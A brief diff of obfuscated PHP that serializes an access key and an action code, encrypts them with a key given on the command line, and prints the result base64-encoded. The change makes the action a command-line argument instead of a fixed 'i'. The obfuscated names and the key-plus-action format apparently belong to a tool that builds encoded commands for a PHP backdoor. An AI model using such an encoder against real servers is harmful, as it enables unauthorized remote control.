@@ -24,6 +24,6 @@ function u79c($z7aa6, $l737fe5)
     return q0da4886(q0da4886($z7aa6, $m9e75), $l737fe5);
 }
 
-echo base64_encode(u79c(serialize(array(ak => "a7a529cf-3f28-4030-a4b5-64ee3f3f9831", a => "i")), $argv[2]));
+echo base64_encode(u79c(serialize(array(ak => "a7a529cf-3f28-4030-a4b5-64ee3f3f9831", a => "$argv[1]")), $argv[2]));
 
 ?>
